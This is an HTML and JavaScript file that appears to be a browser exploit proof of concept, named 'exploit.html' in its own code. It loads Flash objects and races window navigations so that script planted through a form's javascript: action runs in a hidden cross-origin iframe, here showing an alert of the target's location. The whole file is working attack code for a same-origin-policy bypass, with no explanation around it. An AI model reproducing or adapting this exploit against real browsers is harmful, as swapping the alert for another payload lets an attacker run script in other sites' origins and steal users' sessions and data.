<div style="position:fixed;top:0;left:0;height:100%;width:100%;"></div>
<p></p>
<iframe src="https://abc.xyz" style="display:none"></iframe>
<script>
var counter = 0;
function count() {
  if (++counter == 3) {
    document.querySelector('p').innerHTML = '<b>Click anywhere to start.</b>';
  }
}

onclick = function() {
  onclick = null;
  w = window.open('javascript:');
  for (var n = 0; n < 10; n++) {
    var o = w.document.body.appendChild(document.createElement('object'));
    o.data = location.href.split('exploit.html')[0] + 's.swf';
  }
  // 1000 ms should be ample, can probably be reduced.
  setTimeout(go, 1000);
}

var t;
function f() {
  if (!t && !w.document.location) {
    t = 1;
    w.location.href = 'about:blank';
    d = w.document.open();
  }
}

function go() {
  w.location.href = 'javascript:""';
  if (!t) {
    alert('This should never happen.');
    location.reload();
  }
  w.location.href = 'https://abc.xyz';
  i = setInterval(check, 1);
}

function check() {
  try { w.a; } catch(e) {
    clearInterval(i);
    var x = d.createElement('form');
    x.action = 'javascript:opener.frames[0].location="javascript:alert(location)"';
    x.submit();
    w.close();
  }
}
</script>
<object data="s.swf"></object>
<object data="s.swf"></object>
<object data="s.swf"></object>